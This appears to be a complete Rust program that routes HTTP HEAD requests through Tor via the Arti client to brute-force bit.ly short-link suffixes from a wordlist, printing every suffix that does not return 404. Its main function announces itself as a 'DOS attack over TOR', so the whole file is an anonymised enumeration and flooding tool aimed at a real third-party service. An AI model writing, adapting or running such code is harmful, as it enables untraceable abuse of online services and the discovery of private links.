use arti_client::{TorClient, TorClientConfig};
use arti_hyper::*;
use futures::future::join_all;
use hyper::{Body, Client, Method, Request, StatusCode, Uri};
use std::fs::File;
use std::io::{BufRead, BufReader};
use std::str::FromStr;
use tls_api::{TlsConnector as TlsConnectorTrait, TlsConnectorBuilder};
use tls_api_native_tls::TlsConnector;
use tor_rtcompat::PreferredRuntime;

/// Create a single TorClient which will be used to spawn isolated connections
///
/// This Client uses the default config with no other changes
async fn create_tor_client() -> Result<TorClient<PreferredRuntime>, arti_client::Error> {
    let config = TorClientConfig::default();
    TorClient::create_bootstrapped(config).await
}

/// Creates a `hyper::Client` for sending HTTPS requests over Tor
///
/// Note that it first creates an isolated circuit from the `TorClient`
/// passed into it, this is generally an Arti best practice
async fn build_tor_hyper_client(
    baseconn: &TorClient<PreferredRuntime>,
) -> anyhow::Result<Client<ArtiHttpConnector<PreferredRuntime, TlsConnector>>> {
    let tor_client = baseconn.isolated_client();
    let tls_connector = TlsConnector::builder()?.build()?;

    let connector = ArtiHttpConnector::new(tor_client, tls_connector);
    Ok(hyper::Client::builder().build::<_, Body>(connector))
}

/// Returns Ok(true) if Status is not 404
async fn ping_url(
    url: String,
    http: &Client<ArtiHttpConnector<PreferredRuntime, TlsConnector>>,
) -> anyhow::Result<bool> {
    let uri = Uri::from_str(url.as_str())?;
    // Create a new request
    let req = Request::builder()
        .method(Method::HEAD)
        .uri(uri)
        .body(Body::empty())?;

    let resp = http.request(req).await?;

    if resp.status() != StatusCode::NOT_FOUND {
        return Ok(true);
    }

    Ok(false)
}

pub async fn run(
    http: &'static Client<ArtiHttpConnector<PreferredRuntime, TlsConnector>>,
    base_url: &str,
    source_file: &str,
) -> Result<(), anyhow::Error> {
    let file = File::open(source_file)?;
    let reader = BufReader::new(file);

    let base_url: &'static str = Box::leak(base_url.into());

    let tasks = reader
        .lines()
        .map(|line| {
            tokio::spawn(async move {
                let parsed_line = line.unwrap();
                let url = format!("{base_url}{parsed_line}");
                let has_valid_url_response = ping_url(url.clone(), http).await;
                match has_valid_url_response {
                    Ok(true) => {
                        println!("URL: {url}");
                    }
                    Err(err) => {
                        eprintln!("{}", err);
                    }
                    _ => {}
                }
            })
        })
        .collect::<Vec<_>>();

    join_all(tasks).await;

    Ok(())
}

#[tokio::main(flavor = "multi_thread", worker_threads = 12)]
async fn main() -> Result<(), anyhow::Error> {
    println!("Started Discovery!");

    println!("Building Tor Client!");
    let baseconn = create_tor_client().await?;

    println!("Building Tor Hyper Client!");
    let http = build_tor_hyper_client(&baseconn).await?;

    let http: &'static Client<ArtiHttpConnector<PreferredRuntime, TlsConnector>> =
        Box::leak(http.into());

    println!("Starting DOS attack over TOR");
    run(http, "https://bit.ly/you-are-smart-", "./wordlist.txt").await?;

    println!("Exiting!");

    Ok(())
}
